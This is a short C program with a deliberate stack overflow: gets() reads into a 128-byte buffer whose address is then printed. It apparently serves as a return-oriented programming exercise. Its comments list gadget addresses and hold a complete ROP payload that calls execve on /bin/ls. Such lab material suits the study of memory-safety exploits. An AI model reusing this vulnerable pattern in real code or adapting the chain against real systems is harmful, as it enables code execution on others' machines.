#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// Adress for "pop rdi; ret" ==> 0x00 00 7f ff f7 de 3b 72
// Adress for "pop rsi; ret" ==> 0x00 00 7f ff f7 de 45 29
// Adress for "pop rdx; pop ?; ret" ==> 0x00 00 7f ff f7 ed 93 71
// Adress of buffer ==> 0x7f ff ff ff dc 50
// Adress of execve ==> 0x7f ff f7 ea 32 f0
// Value for rbp ==> 0x00 00 7f ff ff ff dd 00


/*
Command for /bin/ls
"/bin/ls\x00"+
"\x50\xdc\xff\xff\xff\x7f\x00\x00"+
"\x00\x00\x00\x00\x00\x00\x00\x00"+
104*"A"+
"\x00\xdd\xff\xff\xff\x7f\x00\x00"+
"\x72\x3b\xde\xf7\xff\x7f\x00\x00"+
"\x50\xdc\xff\xff\xff\x7f\x00\x00"+
"\x29\x45\xde\xf7\xff\x7f\x00\x00"+
"\x58\xdc\xff\xff\xff\x7f\x00\x00"+
"\x71\x93\xed\xf7\xff\x7f\x00\x00"+
"\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x00\x00\x00\x00"+
"\xf0\x32\xea\xf7\xff\x7f\x00\x00"





*/


void func()
{
    char buffer[128];
    gets(buffer);
    printf("%p\n", buffer);
    //dup2(1,0);
}

int main(int argc, char *argv[])
{
    // int n = 0;
    // while (n < 10);
    func();
    return 0;
}